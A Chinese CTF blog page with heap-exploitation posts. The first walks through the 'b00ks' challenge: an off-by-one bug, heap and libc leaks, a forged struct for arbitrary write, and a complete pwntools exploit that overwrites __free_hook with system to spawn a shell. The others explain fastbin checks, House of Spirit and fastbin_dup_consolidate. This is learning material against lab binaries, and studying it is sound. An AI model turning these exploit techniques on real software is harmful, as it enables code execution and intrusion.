<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_B6D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter author name: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !my_read(off_202018, <span class="number">32LL</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;fail to read author_name&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>（本题在 Ubuntu16.04 下复现）</p>
<p>程序最开始要求输入的author name的长度为0x20个字节，并且输入在<code>unk_202040</code>处，因为是用有off-by-one漏洞的<code>my_read</code>函数输入的，所以如果我们输入的author name有32个字节的话，那么结束符就会在<code>unk_202040+0x20</code>处，同时我们要注意的是用来保存book的相关信息的chunk的指针<code>book_struct</code>保存在了<code>*(off_202010 + v2)</code>处（详见上述题目处），也就是<code>unk_202060+v2*8</code>处。所以第一个book的<code>book_struct</code>指针就写在了<code>unk_202060</code>处，那么这时就产生了一个问题</p>
<ol>
<li>当我们输入的author name长度为32个字节的时候，author name的结束符会被第一个book的<code>book_struct</code>指针覆盖掉</li>
<li>因为程序提供的功能中有修改author name这一功能，所以我们还可以通过修改author name从而让结束符覆盖掉第一个book的<code>book_struct</code>指针的低一字节。</li>
</ol>
<p>我们可以利用1来泄漏heap地址（因为show()函数会打印author name），利用2来修改堆指针。</p>
<p>一步一步来，我们先申请一个name_size = 0x20，content_size = 0x40的book</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">&quot;Enter author name:&quot;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;book1&#x27;</span>,<span class="number">0x40</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>然后进gdb看看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x561ece378040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x561ece378050:	0x6161616161616161	0x6161616161616161		==&gt;这32个字节是aunthor name</span><br><span class="line">0x561ece378060:	0x0000561ecf2be0a0	0x0000000000000000		==&gt;这里开始保存book_struct指针</span><br></pre></td></tr></table></figure>

<p>我们再看看此时的堆结构</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ heap</span><br><span class="line">0x561ecf2bd000 PREV_INUSE &#123;			#程序自己申请0x1010个字节的chunk</span><br><span class="line">  prev_size = 0x0, </span><br><span class="line">  size = 0x1011, </span><br><span class="line">  fd = 0xa3436, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x561ecf2be010 FASTBIN &#123;		#这个chunk用来保存book_name</span><br><span class="line">  prev_size = 0x0, </span><br><span class="line">  size = 0x31, </span><br><span class="line">  fd = 0x316b6f6f62, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x561ecf2be040 FASTBIN &#123;		#这个chunk用来保存book_content</span><br><span class="line">  prev_size = 0x0, </span><br><span class="line">  size = 0x51, </span><br><span class="line">  fd = 0x61616161, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x561ecf2be090 FASTBIN &#123;		#这个就是book_struct指向的chunk</span><br><span class="line">  prev_size = 0x0, </span><br><span class="line">  size = 0x31, </span><br><span class="line">  fd = 0x1, </span><br><span class="line">  bk = 0x561ecf2be020, </span><br><span class="line">  fd_nextsize = 0x561ecf2be050, </span><br><span class="line">  bk_nextsize = 0x40</span><br><span class="line">&#125;</span><br><span class="line">0x561ecf2be0c0 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x0, </span><br><span class="line">  size = 0x20f41, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面是book_struct的具体内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x0000561ecf2be0a0</span><br><span class="line">0x561ecf2be0a0:	0x0000000000000001	0x0000561ecf2be020	#id 	book_name的指针</span><br><span class="line">0x561ecf2be0b0:	0x0000561ecf2be050	0x0000000000000040	#book_content的指针   content大小</span><br></pre></td></tr></table></figure>

<p>到这里开始就是重点了，首先我们应该注意到的是edit函数是怎样修改book的内容的，<code>my_read(*(*(off_202010 + i) + 16LL), *(*(off_202010 + i) + 24LL) - 1)</code></p>
<p>这个函数其实就是利用了保存在<code>*(off_202010 + i)</code>处的指针来分别读取book_content指针以及content的size。如果我们能把<code>*(off_202010 + i)</code>处的指针覆盖成<code>book_content</code>指针的话，那么edit函数不就相当于读取<code>*(book_content)+16</code>处的值来作为第一个参数，取<code>*(book_content)+24</code>处的值来作为第二个参数了吗？而我们又知道<code>*(book_content)+16</code>和<code>*(book_content)+24</code>处的值是直接由我们控制的，所以我们就相当于有了一个任意地址写。</p>
<p>那么现在的问题就是，怎么把保存在<code>*(off_202010 + i)</code>处的指针覆盖成<code>book_content</code>指针？</p>
<p>这其实很简单，我们只需要让book_content稍微大一点，让<code>book_struct</code>的低一字节被覆盖成‘\x00’后的这个地址的+16和+24处的内容是能被我们控制的即可。</p>
<p>比如说我们创建的第一个book是这样的话</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;book1&#x27;</span>,<span class="number">0xf0</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>那么<code>book_struct = 0x000055b4705d9150</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x55b46ee78040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55b46ee78050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55b46ee78060:	0x000055b4705d9150	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>我们用author name的结束符将其低一字节覆盖成’\x00’后就等于<code>0x000055b4705d9100</code>，而这个地址显然属于我们book_content的一部分，也就是说这个地址附近的内容都是受我们控制的，那么我们就可以在这上面伪造一个book_struct，从而在edit函数中达到任意地址写的目的。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#part of leak heap_base</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Enter author name:&quot;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;book1&#x27;</span>,<span class="number">0xf0</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;a&quot;</span>*<span class="number">32</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x1150</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;heap_base = &quot;</span>,<span class="built_in">hex</span>(heap_base)</span><br><span class="line"></span><br><span class="line"><span class="comment">#part of 任意地址写</span></span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">0x16</span> + p64(<span class="number">1</span>)*<span class="number">2</span> + p64(heap_base) + p64(<span class="number">0x40</span>)) <span class="comment">#这里我们伪造了book_id、book_content指针和content_size，book_name没有伪造所以打印book1的name时会报错</span></span><br><span class="line">chang_author_name(<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>) <span class="comment">#这里我们用author name的结束符覆盖book_struct指针</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&#x27;ccccccc&#x27;</span>) <span class="comment">#我们再次修改book1的content，实际上修改的是我们想要写的地址</span></span><br></pre></td></tr></table></figure>

<p>这里举个例子，我们想往heap_base这个地址里写值，我们如上构造，然后重头来看一遍</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x55a36a56a040</span><br><span class="line">0x55a36a56a040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55a36a56a050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55a36a56a060:	0x000055a36b2bc150	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>此时<code>book_struct = 0x000055a36b2bc150 </code>，我们在<code>0x000055a36b2bc100</code>处伪造好<code>book_struct</code>结构之后再覆盖掉<code>book_struct</code>的低一字节，如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x55a36a56a040</span><br><span class="line">0x55a36a56a040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55a36a56a050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55a36a56a060:	0x000055a36b2bc100	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>可以看到此时的book_struct指针已经被修改了，我们再来看一下<code>0x000055a36b2bc100</code>这个地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x000055a36b2bc100</span><br><span class="line">0x55a36b2bc100:	0x0000000000000001	0x0000000000000001</span><br><span class="line">0x55a36b2bc110:	0x000055a36b2bb000	0x0000000000000040</span><br></pre></td></tr></table></figure>

<p>我们在这个地址中构造了这样的book_struct，那么此时我们再执行<code>edit(1,&#39;ccccccc&#39;)</code>，那么实际上就会往<code>(*(*(off_202010 + i) + 16LL) == *(0x000055a36b2bc100 + 16) == 0x000055a36b2bb000</code> 这个地址中写值了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/gx 0x000055a36b2bb000</span><br><span class="line">0x55a36b2bb000:	0x0063636363636363</span><br></pre></td></tr></table></figure>

<p>到这里为止任意地址写的详细思路及过程就讲完了，这也就是本题唯一的难点。</p>
<p>我们要任意地址写的话当然是去劫持hook指针，因为FULL RELOR的缘故。那么我们当然还需要泄漏libc。</p>
<p>这里有一个点是：用mmap申请的段跟libc之间的偏移是固定的，所以我们申请一个极大的chunk使得其放在mmap段，再泄露出其地址，减去一个固定的偏移即可得到libc基址。</p>
<p>那么我们该怎么泄漏出book2的地址呢？</p>
<p>这个其实也很简单，因为程序中有打印book相关信息的功能，其所依赖的同样是book_struct结构，而我们前面已经讲了如何伪造一个book_struct，在我们有了heap_base之后，book2的content指针的地址我们同样知道，那么我们只需要将伪造的book_struct的name指针改成book2的content指针的地址就可以利用打印功能泄漏book2_content的地址了，这样我们就得到了libc_base。</p>
<p>最后结合前面讲的任意地址写的方法就可以劫持hook指针了</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./b00ks&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./b00ks&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node4.buuoj.cn&quot;,28612)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size1,name,size2,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recv(timeout = <span class="number">0.25</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size1))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="built_in">str</span>(size2))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">name</span>(<span class="params">content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="comment">#part of leak heap_base</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Enter author name:&quot;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;book1&#x27;</span>,<span class="number">0xf0</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;a&quot;</span>*<span class="number">32</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x1150</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;heap_base = &quot;</span>,<span class="built_in">hex</span>(heap_base)</span><br><span class="line"></span><br><span class="line"><span class="comment">#part of fake book_struct</span></span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">0x16</span> + p64(<span class="number">1</span>) + p64(heap_base + <span class="number">0x11c0</span>) + p64(heap_base + <span class="number">0x1100</span> + <span class="number">16</span>) + p64(<span class="number">0x40</span>))</span><br><span class="line">name(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#part of leak libc_base</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>,<span class="number">0x21000</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;Name: &quot;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">5963792</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_base = &quot;</span>,<span class="built_in">hex</span>(libc_base)</span><br><span class="line">free_hook = libc_base + (<span class="number">0x7f1e8f8f77a8</span> - <span class="number">0x00007f1e8f531000</span>)</span><br><span class="line">system = libc_base + (<span class="number">0x7fdb7950c3a0</span> - <span class="number">0x00007fdb794c7000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#part of hijack __free_hook</span></span><br><span class="line">edit(<span class="number">1</span>,p64(free_hook) + p64(<span class="number">0x8</span>))</span><br><span class="line">edit(<span class="number">1</span>,p64(system))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="Balsn-CTF-2019-PlainText"><a href="#Balsn-CTF-2019-PlainText" class="headerlink" title="Balsn_CTF_2019-PlainText"></a>Balsn_CTF_2019-PlainText</h3><p>思路：</p>
<p>只有一个off-by-null漏洞，能用这个漏洞把bss段上的堆指针盖掉一位，整体思路应该跟前面那题一样</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/05/03/%E5%A0%86%E5%88%A9%E7%94%A8-fastbin/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/03/%E5%A0%86%E5%88%A9%E7%94%A8-fastbin/" class="post-title-link" itemprop="url">堆利用-fastbin</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-05-03 17:47:14" itemprop="dateCreated datePublished" datetime="2022-05-03T17:47:14+08:00">2022-05-03</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-05-11 02:02:25" itemprop="dateModified" datetime="2022-05-11T02:02:25+08:00">2022-05-11</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>学了一段时间堆之后感觉堆的知识点都太乱了，写博客都不好分类，所以就分个大概的类来写吧，这篇博客写的主要关于fast bins相关的东西</p>
<p>主要是关于how2heap中学到的东西，感觉贴源码没有意义，所以只写个大概的总结，或者按照我的理解去写一个源码</p>
<h3 id="关于fast-bin的保护"><a href="#关于fast-bin的保护" class="headerlink" title="关于fast bin的保护"></a>关于fast bin的保护</h3><ol>
<li>double free：一个chunk进入fast bin时，其实是插入这个bin链表的头部，main_arena会设置一个指针直接指向这个块，同时一个chunk准备进入该bin链表时，会<strong>检查main_arena直接指向的块</strong>跟这个准备进入的块是否相同，相同则抛出double free异常。也就是说其只检查bin的链表头，不检查整个链表</li>
<li>从fast bin中取出一个chunk时，会检查该chunk的size位是否跟这个bin链表对应的size相符，不相符则抛出异常。这个size的p位会被fast bin忽略（也就是说无所谓），但是在IS_MMAPPED跟NON_MAIN_ARENA这两种情况下会发生异常。</li>
</ol>
<h4 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h4><p>实验流程：让一个指针指向一个假块，将其free掉再malloc出来，实现任意地址分配。</p>
<p>需要注意的点：① 假块的size位必须属于fast bin范围内。②假块的下一个块的size位必须被设置成一个合理的值（合理即可）。③ 假块的地址要对其。④ 假块的ISMMAP（用来判断这个chunk是否是MMAP的那一位）不能为1，因为MMAPED的块被free掉时会单独处理。</p>
<h4 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    <span class="keyword">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>); <span class="comment">//防止第一个chunk被合并到top chunk</span></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x400</span>); <span class="comment">//触发malloc_consolidate()</span></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;now we malloc 1 = %p\n&quot;</span>,<span class="built_in">malloc</span>(<span class="number">0x40</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc 2 = %p&quot;</span>,<span class="built_in">malloc</span>(<span class="number">0x40</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>malloc_consolidate()函数主要有两个功能：</p>
<ol>
<li>若 fastbin 未初始化，即 global_max_fast 为 0，那就初始化 malloc_state。</li>
<li>如果已经初始化的话，就合并 fastbin 中的 chunk。</li>
</ol>
<p>当我们申请一个堆块，程序遍历完unsorted bin都没有发现能满足我们需求大小的chunk时，便会执行malloc_consolidate()，将fast bin中全部能够合并的chunk进行合并，并将合并之后的大chunk放到对应的small bin或者large bin中，如果有fast bin chunk跟top chunk相邻的话那么会将这个fast bin chunk合并到top chunk里。</p>
<p>这是执行<code>malloc(0x400);</code>之前的bins</p>
<img src="/2022/05/03/%E5%A0%86%E5%88%A9%E7%94%A8-fastbin/fastbin_dup_consolidate-1.jpg" class>

<p>当我们执行<code>malloc(0x400);</code>时，便会触发malloc_consolidate()，将fast bin中的chunk进行合并，并放到对应的small/large bin中。</p>
<img src="/2022/05/03/%E5%A0%86%E5%88%A9%E7%94%A8-fastbin/fastbin_dup_consolidate-2.png" class>

<p>可以看到此时原本的fast bin chunk被放到了small bin中，显然因为此时0x50的fast bin中已经没有chunk了，所以我们可以绕过double free的检查，再将p1 free一次</p>
<img src="/2022/05/03/%E5%A0%86%E5%88%A9%E7%94%A8-fastbin/fastbin_dup_consolidate-3.jpg" class>

<p>这样p1所对应的chunk就会同时出现在small bin和fast bin中</p>
<img src="/2022/05/03/%E5%A0%86%E5%88%A9%E7%94%A8-fastbin/fastbin_dup_consolidate-4.jpg" class>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/04/23/%E5%87%A0%E9%81%93%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98%E7%9A%84%E5%A4%8D%E7%8E%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/23/%E5%87%A0%E9%81%93%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98%E7%9A%84%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">几道入门堆题的复现</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-04-23 21:13:45" itemprop="dateCreated datePublished" datetime="2022-04-23T21:13:45+08:00">2022-04-23</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-05-03 17:43:25" itemprop="dateModified" datetime="2022-05-03T17:43:25+08:00">2022-05-03</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol>
<li><p>当存在uaf漏洞，且程序本身提供了edit这样对堆中的内容直接修改的功能的时候，就可以直接修改fd指针进行堆块伪造</p>
</li>
<li><p>当存在uaf漏洞，但是程序中不存在edit这样的功能，也就是说堆中的内容是在创建该堆时一并输入到堆中的，这种情况下就可以构造double free来修改fd指针进行堆块的伪造</p>
</li>
<li><p>fast bin有一个检查：当从一个fast bin链表中取出堆块时，会检查该取出的堆块的size位是否与该fast bin链表所对应的大小一致，检查不通过就会报错。这带来的一个问题就是我们不能直接让fd指针指向任意位置然后把这个伪造的堆块从fast bin中取出，我们还需要伪造堆块的size位才能将其成功malloc出来。</p>
<p>结合图片说具体一点，例如我们现在通过某种方法将保存0x70大小的chunk的fast bin构造成如下：</p>
<img src="/2022/04/23/%E5%87%A0%E9%81%93%E5%85%A5%E9%97%A8%E5%A0%86%E9%A2%98%E7%9A%84%E5%A4%8D%E7%8E%B0/%E7%9F%A5%E8%AF%86%E7%82%B9-1.jpg" class>

